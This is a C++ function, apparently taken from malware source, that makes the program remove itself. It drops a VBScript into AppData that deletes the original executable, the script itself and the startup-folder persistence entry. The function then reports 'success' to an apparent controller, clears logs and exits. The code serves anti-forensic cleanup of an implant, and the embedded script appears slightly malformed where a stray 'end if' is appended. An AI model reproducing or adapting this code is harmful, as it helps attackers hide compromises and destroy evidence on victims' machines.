void DeleteSelf()
{
	std::string deleteFileLocation = appdata + "\\del.vbs", command;
	std::ofstream vbsFile(deleteFileLocation);

	command = "start " + deleteFileLocation;
	vbsFile << (
		"WScript.Sleep(1000)\n"
		"Set f1 = CreateObject(\"Scripting.FileSystemObject\")\n"
		"Set f2 = CreateObject(\"Scripting.FileSystemObject\")\n"
		"Set f3 = CreateObject(\"Scripting.FileSystemObject\")\n"
		"if (f1.FileExists(\"" + originalPlacementPath + "\")) then f1.DeleteFile(\"" + originalPlacementPath + "\")\n"
		"if (f2.FileExists(\"" + deleteFileLocation + "\")) then f2.DeleteFile(\"" + deleteFileLocation + "\")\n"
		"if (f3.FileExists(\"" + startupPath + "\")) then f3.DeleteFile(\"" + startupPath + "\")"
		"end if"
	
	); vbsFile.close();

	send("success");
	ClearLogs();
	system(command.data());
	exit(0);
}